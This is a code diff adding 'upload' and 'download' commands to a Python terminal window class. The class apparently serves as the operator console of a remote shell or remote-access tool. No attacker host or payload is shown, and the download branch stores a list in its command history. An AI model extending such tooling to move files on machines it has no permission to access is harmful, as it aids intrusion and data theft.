@@ -179,8 +179,47 @@ class TerminalWindow:
         if cmd == "":
             self.insert_prompt()
             self.scroll_to_end()
+            
         elif cmd == "clear":
             self.clear_screen()
+            
+        elif cmd.startswith("upload"):
+            parts = cmd.split()
+            if len(parts) == 3:
+                cmd = parts[0]
+                file_name = parts[1]
+                file_path = parts[2]
+
+                if not os.path.isfile(file_path):
+                    self.insert_line("[-] File not found","light_red")
+                    self.insert_prompt()
+                    self.scroll_to_end()
+                else:
+                    with open(file_path, "rb") as f:
+                        data = f.read()
+
+                    data = cmd.encode() + b" " + file_name.encode() + b"::::" + data
+                    self.set_command(data)
+                    self.command_history.append(cmd)
+                    self.history_index = len(self.command_history)
+                    
+        elif cmd.startswith("download"):
+            parts = cmd.split()
+            if len(parts) == 3:
+                cmd = parts[0]
+                file_name = parts[1]
+                file_path = parts[2]
+
+                data = cmd.encode() + b" " + file_name.encode() + b"::::" + file_path.encode()
+                self.set_command(data)
+            else:
+                cmd = cmd.split()
+                self.set_command(cmd[0])
+                
+            self.command_history.append(cmd)
+            self.history_index = len(self.command_history)
+            
+            
         else:
             self.set_command(cmd)
             self.command_history.append(cmd)
